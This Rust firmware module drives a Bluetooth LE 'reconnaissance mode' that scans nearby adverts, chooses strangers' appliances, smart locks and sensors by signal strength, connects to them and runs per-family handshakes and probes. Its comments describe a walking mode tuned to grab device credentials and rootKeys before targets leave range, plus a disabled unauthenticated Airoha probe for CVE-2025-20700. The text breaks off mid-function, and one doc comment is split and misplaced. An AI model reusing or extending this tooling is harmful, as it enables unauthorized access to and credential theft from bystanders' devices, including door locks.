//! Reconnaissance mode: a single-loop active central that scans, classifies each
//! device by its GATT services, and runs that family's survey→assessment→report.
//!
//! One task owns the radio start-to-finish — no inter-task mutexes — cycling:
//! listen for adverts (5 s), pick the strongest device whose type the advert alone
//! reveals — we do NOT connect just to classify — connect and discover its
//! services, then branch by kind:
//!   * **Midea** (0x06A8 advert → FFA0) — C1→C2→C3 handshake, then decrypt status.
//!     A Midea whose FFA0 is absent/gated is a stable dead-end (`no_control`),
//!     tracked and cooled long instead of re-probed every cycle.
//!   * **Airoha** (RACE) — unauthenticated READ_SDK_VERSION/GET_BD_ADDRESS probe
//!     (CVE-2025-20700). Currently DISABLED in `classify` (earbuds not probed).
//!   * **Others** (PortaSplit, fan-and-light, Haier, Hisense, JOMOO, DESSMANN,
//!     U-tec, Mi sensor/scale) — each family's own targeted probe or GATT walk.
//!
//! Then disconnect. A failed probe stays a candidate; a completed one cools down.
//!
//! The generic BLE-central machinery (connect, CSA#1, T_IFS, ATT/GATT walk) is
//! shared with GATT-enum in [`crate::central`]; this module owns the per-family
//! specifics ([`crate::device::midea`], [`crate::device::airoha`]) and the device
//! table. The onboard LED (driven by [`led_task`]) shows the current phase.

use core::cell::UnsafeCell;
use core::fmt::Write;

use core::num::NonZeroU64;
use core::sync::atomic::Ordering;

use embassy_nrf::pac;
use embassy_nrf::pac::radio::vals;
use embassy_time::{Duration, Instant, Timer};

use super::ModeRef;
use crate::central::{
    ADV_CHANNELS, ATT_MTU_MAX, CONN_AA, CONNECT_ROUNDS, Candidate, Characteristic, Conn,
    ConnectStats, Interest, LISTEN_EVENTS, MAX_CHARS_PER_SVC, MAX_SERVICES, RX_BUF,
    SURVEY_DWELL_MS, SURVEY_ROUNDS, Service, att_write_await_notify, configure_conn_radio,
    discover_characteristics, discover_descriptors, discover_services, exchange_mtu,
    listen_notifications, pick_access_address, pick_conn_params, randomize_our_addr, subscribe,
    terminate, try_connect_rounds, walk_services,
};
use crate::hal::radio::{configure_ble, ensure_disabled, wait_disabled};
use crate::{Rng, decoder, device, led};

// ── Config ────────────────────────────────────────────────────────────────────

/// Device table capacity. Full table → the oldest-seen entry is evicted.
const TABLE_MAX: usize = 128;
/// Distinct devices a single scan window tracks before folding into the table.
const SCAN_MAX: usize = 64;
/// Minimum gap between advert-liveness LED winks (rate-limit for the per-advert
/// flash so it reads as a ~4 Hz heartbeat, not an invisible blur).
const ADV_FLASH_MS: u64 = 250;

/// Tuning knobs that differ between the two operating modes.
struct ReconParams {
    /// How long to listen for adverts each cycle.
    scan_window_ms: u64,
    /// Stop scanning and connect the moment a qualifying Midea advert is seen
    /// (interrupt-driven). When `false`, the full `scan_window_ms` always elapses
    /// before the first connection attempt.
    interrupt_on_midea: bool,
    /// Ignore candidates with RSSI below this threshold. On-the-go, a weak signal
    /// means the device will be out of range before the probe completes; sit-still
    /// can afford to try marginal signals because the device is not moving.
    rssi_floor: i16,
    /// After a completed probe, keep the device out of the candidate pool for this
    /// long. Shorter on-the-go (the device will be gone anyway; if it reappears,
    /// re-probe sooner).
    cooldown_ms: u64,
    /// When `true`, walk every GATT service after the handshake for the full data-
    /// collection log. When `false`, skip the walk — the credential and one status
    /// frame are enough for on-the-go. The walk is the largest single time sink.
    full_walk: bool,
}

/// Stationary data-collection. Devices come and go at leisure; missing one is not
/// catastrophic because it may reappear. Full GATT walk is desirable for the log.
const SIT_STILL: ReconParams = ReconParams {
    scan_window_ms: 5_000,
    interrupt_on_midea: false,
    rssi_floor: -100, // accept everything in range
    cooldown_ms: 15 * 60 * 1000,
    full_walk: true,
};

/// Mobile data-collection. Devices pass by with ~30 s windows; maximise the
/// probability of getting the credential before the peer leaves range. No full walk
/// — the handshake + one status frame is the goal.
///
/// Params tuned from the 2026-08-12T18:06:05 midea log (9 435 s, 166 attempts):
///   scan→connect latency median ~300 ms → 1 500 ms gives 4+ advert-channel sweeps
///   before interrupt fires (or the window ends).
///   RSSI floor −85: the useful-probe median from the 2026-08-23 recon — links
///   that yielded services clustered at −85; the −88..−95 band was pure
///   ev_addr=0 link-failure noise. Cutting there keeps the real targets without
///   the re-probe storm.
///   Cooldown 3 min: walking at ~1 m/s covers 180 m in 3 min; device is gone anyway.
#[allow(dead_code)]
const ON_THE_GO: ReconParams = ReconParams {
    scan_window_ms: 1_500,
    interrupt_on_midea: true,
    rssi_floor: -85,
    cooldown_ms: 3 * 60 * 1000,
    full_walk: false,
};

/// Active parameter set.
#[allow(dead_code)]
const SIT_STILL_PARAMS: &ReconParams = &SIT_STILL;
const PARAMS: &ReconParams = &ON_THE_GO;

// ── Timestamps (Option<NonZeroU64>: ms since boot, None = never) ───────────────

/// Milliseconds since boot as a `NonZeroU64` — the `+1` keeps it non-zero so
/// `Option<NonZeroU64>` gets the niche and `None` cleanly means "never".
fn stamp() -> NonZeroU64 {
    NonZeroU64::new(Instant::now().as_millis() + 1).unwrap()
}
/// ms elapsed since a stamp, or `-1` when never set (for logging / oldest-wins).
fn age_ms(t: Option<NonZeroU64>) -> i64 {
    match t {
        Some(t) => (stamp().get() - t.get()) as i64,
        None => -1,
    }
}

// ── Device table ──────────────────────────────────────────────────────────────

/// How far a device has got through the discover→probe cycle.
#[derive(Clone, Copy, PartialEq, Eq)]
enum ProbeState {
    Seen,
    Probed,
    ProbeFailed,
}
impl core::fmt::Display for ProbeState {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(match self {
            ProbeState::Seen => "seen",
            ProbeState::Probed => "probed",
            ProbeState::ProbeFailed => "probe_failed",
        })
    }
}

/// Outcome of the Midea control-channel handshake for this device.
#[derive(Clone, Copy, PartialEq, Eq)]
enum HandshakeState {
    NoHandshake,
    HandshakeSuccessful,
    HandshakeFail,
    /// The device answered our c1/c2 with a security error (ff04) — it rejects
    /// the control handshake outright. Cooled far longer so it stops hogging the
    /// picker every few minutes.
    Unsupported,
    /// The device served its ATT but has no control profile sonde can use (e.g.
    /// a non-AC Midea with no 0xFFA0, or a GATT walk that found no known control
    /// service). Stable knowledge — cooled far longer so a known dead-end stops
    /// being re-probed every cooldown cycle.
    NoControl,
}
impl core::fmt::Display for HandshakeState {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(match self {
            HandshakeState::NoHandshake => "no_handshake",
            HandshakeState::HandshakeSuccessful => "handshake_successful",
            HandshakeState::HandshakeFail => "handshake_fail",
            HandshakeState::Unsupported => "unsupported",
            HandshakeState::NoControl => "no_control",
        })
    }
}

/// Device family, decided from the GATT services found during a probe (or hinted
/// from the advert for Midea, whose serial is broadcast). Selects the
/// survey→assessment→report branch.
#[derive(Clone, Copy, PartialEq, Eq)]
enum DeviceKind {
    Unknown,
    Midea,
    /// DESSMANN smart-lock (advert name `LOCK_`, GATT channel 0xFFE9/0xFFE4).
    Dessmann,
    /// U-tec / ULTRALOQ smart lock (ServiceData16 0xFF01, token char 0x7220).
    Utech,
    /// Mi Body Composition Scale (Newbit `MI_Scale` clone; measurement notify).
    Miscale,
    /// MiBeacon sensor (XMZNMS08LM door/window sensor 2, LYWSD03MMC temp/humidity
    /// monitor 2) — probed by reading its GATT sensor values.
    Misensor,
    /// Midea "PortaSplit" portable AC — a separate family from [`DeviceKind::Midea`]
    /// (write-only `0xFF02/0xFF01` channel, key derived from the advert).
    PortaSplit,
    /// Midea fan-and-light — another separate family (`0xAAAA` service, `0xBBB0`
    /// write / `0xBBB1` notify, state broadcast in the advert).
    FanLight,
    /// Haier U-home appliance (mfg 0x0929) — GATT-walked to learn what it serves.
    Haier,
    /// Hisense smart-life appliance (ServiceData16 0xF005) — GATT-walked to map
    /// its `3a69…` BLE control profile.
    Hisense,
    /// JOMOO smart bathroom (name `JOMOO…`) — Telink `0xFFF0` control profile.
    Jomoo,
    /// Never constructed while Airoha RACE detection is disabled in `classify`; kept
    /// (with the branch that would set it) for re-enabling.
    #[allow(dead_code)]
    Airoha,
    Generic,
}
impl core::fmt::Display for DeviceKind {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(match self {
            DeviceKind::Unknown => "unknown",
            DeviceKind::Midea => "midea",
            DeviceKind::Dessmann => "dessmann",
            DeviceKind::Utech => "utech",
            DeviceKind::Miscale => "miscale",
            DeviceKind::Misensor => "misensor",
            DeviceKind::PortaSplit => "portasplit",
            DeviceKind::FanLight => "fanlight",
            DeviceKind::Haier => "haier",
            DeviceKind::Hisense => "hisense",
            DeviceKind::Jomoo => "jomoo",
            DeviceKind::Airoha => "airoha",
            DeviceKind::Generic => "generic",
        })
    }
}

/// One tracked device.
#[derive(Clone, Copy)]
struct DeviceEntry {
    /// 14-byte Midea serial from the advert, when present; `None` for non-Midea.
    sn: Option<[u8; 14]>,
    /// Midea device's real MAC from the longer mfg frame, when present — feeds
    /// the rootKey in place of the (possibly random) on-air address.
    mac: Option<[u8; 6]>,
    /// PortaSplit advert key material (`mac ‖ sn ‖ token`), when present; `None`
    /// for every other kind.
    ps: Option<[u8; 18]>,
    /// Fan-light last-seen state (`mode, brightness, color, timer LE, speed`),
    /// when present; `None` for every other kind.
    fl: Option<[u8; 6]>,
    /// Midea v2 capability block (bind/config posture, `is_ble_controller` — the
    /// FFA0 no-bind signal) decoded from the advert when broadcast (rarely).
    cap: Option<crate::device::midea::Capability>,
    addr: [u8; 6],
    addr_random: bool,
    /// Strongest RSSI seen; drives pick order (least-negative wins).
    rssi: i16,
    last_seen: Option<NonZeroU64>,
    last_probed: Option<NonZeroU64>,
    /// Family, set once a probe classifies it (advert gives a Midea hint earlier).
    kind: DeviceKind,
    probe_state: ProbeState,
    handshake_state: HandshakeState,
}

type Table = heapless::Vec<DeviceEntry, TABLE_MAX>;

/// The device table. A single task owns it start-to-finish, so it needs no mutex
/// — the `UnsafeCell` is only to get a `&'static mut` out of a static (same idiom
/// as the radio DMA buffers); there is exactly one accessor, [`run`].
struct TableCell(UnsafeCell<Table>);
unsafe impl Sync for TableCell {}
static TABLE: ModeRef<TableCell> = ModeRef::new();

/// A cooldown record: a probed address and when it may be probed again. Held in a
/// small ring owned by [`run`] — SEPARATE from the device table (which lists
/// only tracked device kinds). It exists so the candidate picker makes progress
/// instead of re-probing the strongest device every round, without tabling the
/// generics.
#[derive(Clone, Copy)]
struct Recent {
    addr: [u8; 6],
    until: NonZeroU64,
}
const RECENT_MAX: usize = 128;
type RecentRing = heapless::Vec<Recent, RECENT_MAX>;

/// Whether `addr` is still within its probe cooldown.
fn in_cooldown(recent: &RecentRing, addr: &[u8; 6]) -> bool {
    let now = Instant::now().as_millis();
    recent
        .iter()
        .any(|r| &r.addr == addr && r.until.get() > now)
}

/// Record `addr` as probed, cooling it for `dur_ms`. Updates an existing record or
/// inserts one, evicting the soonest-to-expire entry when full.
fn mark_recent(recent: &mut RecentRing, addr: [u8; 6], dur_ms: u64) {
    let until = NonZeroU64::new(Instant::now().as_millis() + dur_ms + 1).unwrap();
    if let Some(r) = recent.iter_mut().find(|r| r.addr == addr) {
        r.until = until;
        return;
    }
    if recent.is_full()
        && let Some(soonest) = (0..recent.len()).min_by_key(|&i| recent[i].until.get())
    {
        recent.swap_remove(soonest);
    }
    let _ = recent.push(Recent { addr, until });
}

/// Add or refresh a *tracked* device in the table. Only the known device kinds
/// are ever tracked (see the `matches!` gate in [`run`]); Unknown and Generic
/// are never added. Evicts the oldest-seen entry when full.
fn track(
    table: &mut Table,
    c: &Candidate,
    kind: DeviceKind,
    state: ProbeState,
    hs: HandshakeState,
) {
    debug_assert!(matches!(
        kind,
        DeviceKind::Midea
            | DeviceKind::PortaSplit
            | DeviceKind::FanLight
            | DeviceKind::Misensor
            | DeviceKind::Haier
            | DeviceKind::Hisense
            | DeviceKind::Jomoo
            | DeviceKind::Airoha
            | DeviceKind::Dessmann
            | DeviceKind::Utech
            | DeviceKind::Miscale
    ));
    if let Some(e) = table.iter_mut().find(|e| e.addr == c.addr) {
        if c.rssi > e.rssi {
            e.rssi = c.rssi;
        }
        if let Some(Interest::Midea { sn, mac }) = c.interest {
            e.sn = Some(sn);
            e.mac = mac;
        }
        if c.cap.is_some() {
            e.cap = c.cap;
        }
        e.kind = kind;
        e.probe_state = state;
        e.handshake_state = hs;
        e.last_seen = Some(stamp());
        e.last_probed = Some(stamp());
        return;
    }
    if table.is_full()
        && let Some(oldest) = (0..table.len()).max_by_key(|&i| age_ms(table[i].last_seen))
    {
        table.swap_remove(oldest);
    }
    let _ = table.push(DeviceEntry {
        sn: c.interest.and_then(|i| i.midea_sn()),
        mac: c.interest.and_then(|i| i.midea_mac()),
        ps: c.interest.and_then(|i| i.portasplit_material()),
        fl: c.interest.and_then(|i| i.fanlight_state()),
        cap: c.cap,
        addr: c.addr,
        addr_random: c.addr_random,
        rssi: c.rssi,
        last_seen: Some(stamp()),
        last_probed: Some(stamp()),
        kind,
        probe_state: state,
        handshake_state: hs,
    });
}

/// Refresh RSSI / last-seen of already-tracked devices from a scan (so the table
/// log stays current), adding nothing new.
fn refresh_seen(table: &mut Table, found: &[Candidate]) {
    for c in found {
        if let Some(e) = table.iter_mut().find(|e| e.addr == c.addr) {
            if c.rssi > e.rssi {
                e.rssi = c.rssi;
            }
            if c.cap.is_some() {
                e.cap = c.cap;
            }
            e.last_seen = Some(stamp());
        }
    }
}

/// Dump the tracked-device table — one line per entry — on a slow cadence so a
/// log shows what the table holds (kind / SN / probe + handshake state / RSSI /
/// ages) without a second look. The table is otherwise invisible (`entries=` is
/// just a count): every probe line is in the log, but nothing said which devices
/// were tracked, in what state, or how long ago.
fn dump_table(table: &Table) {
    ulogf!("rtable: {} entries\r\n", table.len());
    for e in table.iter() {
        let sn = e.sn.map(|s| sn_string(&s)).unwrap_or_default();
        let ty =
            e.sn.map(|s| crate::device::midea::device_type(&s))
                .unwrap_or("");
        ulogf!(
            "  {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} kind={} sn={} type={} probe={} hs={} rssi={} seen={}s probed={}s\r\n",
            e.addr[5],
            e.addr[4],
            e.addr[3],
            e.addr[2],
            e.addr[1],
            e.addr[0],
            e.kind,
            sn,
            ty,
            e.probe_state,
            e.handshake_state,
            e.rssi,
            age_ms(e.last_seen).max(0) / 1000,
            age_ms(e.last_probed).max(0) / 1000
        );
        // The advert capability block (broadcast rarely) — bind/config posture
        // and the FFA0 no-bind (`is_ble_controller`) signal, decoded passively.
        if let Some(cap) = e.cap {
            ulogf!("         advert: {}\r\n", cap.fmt());
        }
    }
}

/// Pick the strongest-RSSI scan candidate not currently in probe cooldown and
/// above the RSSI floor in the active params.
fn pick_candidate(found: &[Candidate], recent: &RecentRing) -> Option<usize> {
    let mut best: Option<usize> = None;
    for i in 0..found.len() {
        if found[i].rssi < PARAMS.rssi_floor {
            continue; // too weak — likely out of range before probe completes
        }
        if in_cooldown(recent, &found[i].addr) {
            continue;
        }
        let better = match best {
            None => true,
            Some(j) => {
                // A DESSMANN lock is probed first, ahead of the Midea fleet —
                // they are few, persistent, and the command probe is quick.
                let pi = found[i].interest.map_or(0, |i| i.priority());
                let pj = found[j].interest.map_or(0, |i| i.priority());
                if pi != pj {
                    pi > pj
                } else {
                    found[i].rssi > found[j].rssi
                }
            }
        };
        if better {
            best = Some(i);
        }
    }
    best
}

// ── LED: phase colour + event flashes ─────────────────────────────────────────
//
// One loop, so the LED simply names the current step. Two rules keep it readable:
//   * the base colour is the current phase (a stuck colour names a wedged step);
//   * flashes are events, always settling back to the phase colour, so a flash
//     never leaves the LED misreporting state.
//
// | Colour          | Meaning                                              |
// |-----------------|------------------------------------------------------|
// | Off             | between cycles                                        |
// | Green           | listening for adverts (white wink per advert = alive)|
// | Blue            | connecting + enumerating a device's GATT             |
// | Magenta         | C1→C2→C3 handshake in progress                       |
// | Cyan            | listening for subscriptions / status                 |
// | Green flash ×2  | handshake succeeded                                  |
// | Yellow flash ×2 | handshake failed                                     |
// | White flash ×1  | enumerated, no FFA1/FFA2 (subscribe-only)            |
// | Red flash ×1    | connect failed                                       |

#[derive(Clone, Copy)]
enum Phase {
    Idle = 0,
    Scan = 1,
    Enumerate = 2,
    Handshake = 3,
    Listen = 4,
}

static PHASE: ModeRef<core::sync::atomic::AtomicU8> = ModeRef::new();

/// Recon-only device knowledge and UI state. This is the largest common-mode
/// allocation, but it is needed by no other boot mode.
pub struct Storage {
    table: TableCell,
    phase: core::sync::atomic::AtomicU8,
}

impl Storage {
    pub const fn new() -> Self {
        Self {
            table: TableCell(UnsafeCell::new(heapless::Vec::new())),
            phase: core::sync::atomic::AtomicU8::new(0),
        }
    }
}

impl Default for Storage {
    fn default() -> Self {
        Self::new()
    }
}

/// # Safety
/// Must be called exactly once before recon tasks start.
pub unsafe fn bind_storage(storage: &'static Storage) {
    unsafe {
        TABLE.bind(&storage.table);
        PHASE.bind(&storage.phase);
    }
}

impl Phase {
    fn colour(self) -> led::Rgb {
        match self {
            Phase::Idle => led::OFF,
            Phase::Scan => led::GREEN,
            Phase::Enumerate => led::BLUE,
            Phase::Handshake => led::MAGENTA,
            Phase::Listen => led::CYAN,
        }
    }
    fn from_u8(v: u8) -> Self {
        match v {
            1 => Phase::Scan,
            2 => Phase::Enumerate,
            3 => Phase::Handshake,
            4 => Phase::Listen,
            _ => Phase::Idle,
        }
    }
}

/// Enter a phase: record it and light its colour.
fn set_phase(p: Phase) {
    PHASE.store(p as u8, Ordering::Relaxed);
    led::solid(p.colour());
}

/// Flash an event colour, settling back to the current phase colour.
fn flash(colour: led::Rgb, count: u16) {
    let base = Phase::from_u8(PHASE.load(Ordering::Relaxed)).colour();
    led::blink_then(colour, base, count, 60, 60);
}

// ── Main loop ───────────────────────────────────────────────────────────────

/// The whole mode in one task: scan → pick → probe → record, forever. The radio
/// is never contended (no other task touches it) and never idle (with nothing to
/// probe it simply scans again).
pub async fn run() -> ! {
    let mut rng = Rng(0x6D69_6465);
    // SAFETY: `run` is the sole accessor of TABLE, spawned once.
    let table = unsafe { &mut *TABLE.0.get() };
    // Probe-cooldown ring, owned here (not a static). Distinct from the device
    // table: it remembers every probed address so the picker advances, but the
    // table itself only ever holds the tracked device kinds.
    let mut recent: RecentRing = heapless::Vec::new();
    let mut last_dump = stamp();
    loop {
        // 1. Listen for adverts; refresh already-tracked devices, but add nothing —
        //    a device only enters the table once a probe classifies it a known kind.
        set_phase(Phase::Scan);
        let (found, adv_seen) = scan(&mut rng, &recent).await;
        refresh_seen(table, &found);
        log_captured(adv_seen, &found, table.len());
        // The table dump cadence: ~1/min — the table is the "what we got" record,
        // and a minute of round time is the right granularity for how it changes.
        if age_ms(Some(last_dump)) > 60_000 {
            dump_table(table);
            last_dump = stamp();
        }
        // Log the candidate pool when there is a real choice — a handshakable
        // device the picker skips (in cooldown / below floor) should be visible,
        // not silent.
        if found.len() >= 2 {
            ulogf!("rscan: candidates {}\r\n", found.len());
            for c in &found {
                let sn = c
                    .interest
                    .and_then(|i| i.midea_sn())
                    .map(|s| sn_string(&s))
                    .unwrap_or_default();
                // The appliance type comes from the advert serial — the fleet
                // composition is visible without connecting to anyone.
                let ty = c
                    .interest
                    .and_then(|i| i.midea_sn())
                    .map(|s| device::midea::device_type(&s))
                    .unwrap_or("");
                ulogf!(
                    "  cand {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} rssi={} sn={} type={} cooled={}\r\n",
                    c.addr[5],
                    c.addr[4],
                    c.addr[3],
                    c.addr[2],
                    c.addr[1],
                    c.addr[0],
                    c.rssi,
                    sn,
                    ty,
                    in_cooldown(&recent, &c.addr)
                );
            }
        }

        // 2. Pick the strongest scan candidate not in probe cooldown. `scan` only
        //    collects advert-identifiable devices (today: Midea), so we never
        //    connect just to classify. Unknown/generic devices are never candidates
        //    and never enter the table; the picker works off the scan list.
        let Some(ci) = pick_candidate(&found, &recent) else {
            set_phase(Phase::Idle);
            continue; // nothing to probe → scan again (never idle)
        };
        let cand = found[ci];
        let e = DeviceEntry {
            sn: cand.interest.and_then(|i| i.midea_sn()),
            mac: cand.interest.and_then(|i| i.midea_mac()),
            ps: cand.interest.and_then(|i| i.portasplit_material()),
            fl: cand.interest.and_then(|i| i.fanlight_state()),
            cap: cand.cap,
            addr: cand.addr,
            addr_random: cand.addr_random,
            rssi: cand.rssi,
            last_seen: Some(stamp()),
            last_probed: None,
            kind: match cand.interest {
                Some(Interest::Dessmann) => DeviceKind::Dessmann,
                Some(Interest::Utech) => DeviceKind::Utech,
                Some(Interest::MiSensor) => DeviceKind::Misensor,
                Some(Interest::MiScale) => DeviceKind::Miscale,
                Some(Interest::Midea { .. }) => DeviceKind::Midea,
                Some(Interest::PortaSplit(_)) => DeviceKind::PortaSplit,
                Some(Interest::FanLight(_)) => DeviceKind::FanLight,
                Some(Interest::Haier) => DeviceKind::Haier,
                Some(Interest::Hisense) => DeviceKind::Hisense,
                Some(Interest::Jomoo) => DeviceKind::Jomoo,
                None => DeviceKind::Unknown,
            },
            probe_state: ProbeState::Seen,
            handshake_state: HandshakeState::NoHandshake,
        };

        // 3. Connect, classify, run the kind's survey→assessment→report branch.
        let (probe_state, kind, hs_state) = probe_device(&mut rng, &e).await;

        // 4a. Cooldown: every probe cools down so the picker moves on. A failed
        //     probe (no link / discovery lost) cools for a short slice — it stays
        //     a candidate and will be retried, but not hammered every round (the
        //     −95-floor storm re-probed one weak device 2763× because failures
        //     were uncooled). A completed probe cools for the full cooldown, and
        //     a rejected / no-control-profile device far longer (neither changes
        //     soon, so it must stop hogging the picker each cycle).
        // A completed discovery walk (Haier/Hisense/JOMOO) is stable knowledge —
        // the GATT profile won't change in a few minutes, so cool these like a
        // rejected / no-control device instead of re-walking them every cycle
        // (the Haier U-AC fleet was re-grabbed every 3 min on success, 30 s on
        // failure — most of its walks fail at −84/−85, so it hogged the picker).
        let stable_walk = (matches!(probe_state, ProbeState::Probed)
            && matches!(kind, DeviceKind::Haier | DeviceKind::Hisense | DeviceKind::Jomoo
                | DeviceKind::Utech | DeviceKind::Misensor))
            // A bound Midea: the rootKey is known and the profile is resolved —
            // re-handshaking every cycle adds nothing.
            || matches!(hs_state, HandshakeState::HandshakeSuccessful);
        let cool = if stable_walk
            || matches!(
                hs_state,
                HandshakeState::Unsupported | HandshakeState::NoControl
            ) {
            UNSUPPORTED_COOLDOWN_MS
        } else if matches!(probe_state, ProbeState::ProbeFailed) {
            PARAMS.cooldown_ms / 6 // ~30 s at the 3-min default
        } else {
            PARAMS.cooldown_ms
        };
        mark_recent(&mut recent, cand.addr, cool);
        // 4b. Only Midea/PortaSplit/FanLight/Airoha etc. are tracked in the table;
        //     unknown and generic are probed and logged but never added.
        if matches!(
            kind,
            DeviceKind::Midea
                | DeviceKind::PortaSplit
                | DeviceKind::FanLight
                | DeviceKind::Haier
                | DeviceKind::Hisense
                | DeviceKind::Jomoo
                | DeviceKind::Airoha
                | DeviceKind::Dessmann
                | DeviceKind::Utech
                | DeviceKind::Miscale
        ) {
            track(table, &cand, kind, probe_state, hs_state);
        }
    }
}

// ── Midea protocol ────────────────────────────────────────────────────────────
// The C1→C2→C3 handshake + status-query driver lives in [`midea`]; here we keep
// the shared handshake timeout, the cooldown policy for an unsupported control
// type, and the shared SN formatter.

mod dessmann;
mod mi;
mod midea;

/// How a targeted control-profile resolve turned out. Shared by the Midea and
/// PortaSplit probes (both resolve their control channel by targeted Find By
/// Type Value rather than a full service walk).
#[derive(Clone, Copy)]
pub(super) enum SvFind {
    /// Profile resolved: write + (optionally) notify value handles, with the
    /// notify CCCD enabled when the profile needs one.
    Found(crate::device::midea::gatt::Profile),
    /// Service genuinely absent (peer err 0x0A).
    Absent,
    /// Service present but the find was refused (auth/encryption-gated, …).
    Gated(u8),
    /// Service present but the write/notify pair is not among its chars.
    NoChars,
    /// Link lost / unparseable reply — no conclusion.
    Unknown,
}

/// Resolve a control profile by targeted discovery: find the service UUID with
/// [`crate::central::find_service16`] — the ATT error response is the existence
/// signal — then locate `write_char` + (optionally) `notify_char` within its
/// handle range and enable the notify CCCD. No full GATT walk.
pub(super) async fn resolve_profile(
    conn: &mut Conn,
    svc_uuid: u16,
    write_char: u16,
    notify_char: Option<u16>,
) -> SvFind {
    use crate::central::{
        Characteristic, MAX_CHARS_PER_SVC, Service, ServiceFind, discover_characteristics,
    };

    let (start, end) = match crate::central::find_service16(conn, svc_uuid).await {
        ServiceFind::Found { start, end } => (start, end),
        ServiceFind::Absent => return SvFind::Absent,
        ServiceFind::Gated(code) => return SvFind::Gated(code),
        ServiceFind::Unknown => return SvFind::Unknown,
    };
    let svc = Service {
        start,
        end,
        uuid: [0u8; 16],
        uuid_len: 2,
    };
    let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
    discover_characteristics(conn, &svc, &mut chars).await;
    let mut w = None; // write value handle
    let mut n = None; // notify value handle
    let mut n_idx = 0;
    for (ci, c) in chars.iter().enumerate() {
        let u = crate::device::uuid16(&c.uuid[..c.uuid_len as usize]);
        if u == Some(write_char) {
            w = Some(c.value_handle);
        }
        if notify_char.is_some() && u == notify_char {
            n = Some(c.value_handle);
            n_idx = ci;
        }
    }
    let write_h = match w {
        Some(h) => h,
        None => return SvFind::NoChars,
    };
    if notify_char.is_some() {
        let Some(notify_h) = n else {
            return SvFind::NoChars;
        };
        enable_cccd(conn, &chars, n_idx, end).await;
        SvFind::Found(crate::device::midea::gatt::Profile { write_h, notify_h })
    } else {
        SvFind::Found(crate::device::midea::gatt::Profile {
            write_h,
            notify_h: 0,
        })
    }
}

/// Connection events to wait for a handshake reply notification — shared by the
/// midea probe and the dessmann/mi probes that use the same write-and-notify
/// exchange.
const HS_REPLY_EVENTS: u32 = 60;

/// Cooldown for a device that rejected the control handshake with a security
/// error (ff04): "unsupported type" will not change in a few minutes, so keep it
/// out of the candidate pool this long instead of the normal [`PARAMS`] cooldown.
const UNSUPPORTED_COOLDOWN_MS: u64 = 45 * 60 * 1000;

/// Format the 14-byte ASCII short serial (printable characters only) for logging.
fn sn_string(sn: &[u8; 14]) -> heapless::String<14> {
    let mut s = heapless::String::new();
    for &b in sn {
        if (0x20..=0x7E).contains(&b) {
            let _ = s.push(b as char);
        }
    }
    s
}

// ── Radio operations ──────────────────────────────────────────────────────────
// Device-of-interest detection from an advert is [`crate::device::classify_interest`].

/// One scan window: sweep the advertising channels for [`SCAN_WINDOW_MS`], return
/// the Midea appliances heard (deduped by SN, strongest RSSI), and log a capture
/// Log the per-round scan tally: packets received (`adv_seen`, every CRC-ok
/// advertising PDU) and distinct devices of interest per type (from `found` —
/// device counts, not packets), plus the tracked-table size — one line per scan
/// round.
fn log_captured(adv_seen: u32, found: &[Candidate], entries: usize) {
    ulogf!(
        "rscan: captured adv={} midea={} portasplit={} fanlight={} haier={} hisense={} jomoo={} dessmann={} utech={} misensor={} miscale={} distinct={} entries={}\r\n",
        adv_seen,
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::Midea { .. })))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::PortaSplit(_))))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::FanLight(_))))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::Haier)))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::Hisense)))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::Jomoo)))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::Dessmann)))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::Utech)))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::MiSensor)))
            .count(),
        found
            .iter()
            .filter(|c| matches!(c.interest, Some(Interest::MiScale)))
            .count(),
        found.len(),
        entries,
    );
}

/// tally. A brief white LED wink per advert (rate-limited) shows the radio alive.
async fn scan(rng: &mut Rng, recent: &RecentRing) -> (heapless::Vec<Candidate, SCAN_MAX>, u32) {
    configure_ble();
    let r = pac::RADIO;
    let mut found: heapless::Vec<Candidate, SCAN_MAX> = heapless::Vec::new();
    let mut others: heapless::Vec<[u8; 14], 32> = heapless::Vec::new();
    let mut adv_seen = 0u32; // every CRC-ok advertising PDU this round
    let mut last_flash: Option<Instant> = None; // rate-limit for the liveness wink
    let end = Instant::now() + Duration::from_millis(PARAMS.scan_window_ms);
    while Instant::now() < end {
        for &(ch_idx, freq) in ADV_CHANNELS.iter() {
            ensure_disabled();
            r.frequency().write(|w| {
                w.set_frequency(freq);
                w.set_map(vals::Map::Default);
            });
            r.datawhiteiv().write(|w| w.set_datawhiteiv(ch_idx));
            r.packetptr().write_value(RX_BUF.0.get() as u32);
            r.events_end().write_value(0);
            r.events_crcok().write_value(0);
            r.events_address().write_value(0);
            r.events_disabled().write_value(0);
            r.shorts().write(|w| {
                w.set_rxready_start(true);
                w.set_address_rssistart(true);
            });
            r.tasks_rxen().write_value(1);

            let deadline = Instant::now() + Duration::from_millis(SURVEY_DWELL_MS);
            while Instant::now() < deadline {
                if r.events_end().read() != 0 {
                    r.events_end().write_value(0);
                    let crc_ok = r.events_crcok().read() != 0;
                    let rssi = -(r.rssisample().read().rssisample() as i16);
                    r.events_crcok().write_value(0);
                    r.events_address().write_value(0);
                    if crc_ok {
                        adv_seen += 1;
                        // Liveness heartbeat: a brief white wink on the green scan
                        // base each time we hear an advert (rate-limited). Steady
                        // winking = radio alive and receiving; a still LED means it
                        // has gone deaf (RF/antenna), distinct from "no appliances".
                        let now = Instant::now();
                        if last_flash.is_none_or(|t| (now - t).as_millis() >= ADV_FLASH_MS) {
                            flash(led::WHITE, 1);
                            last_flash = Some(now);
                        }
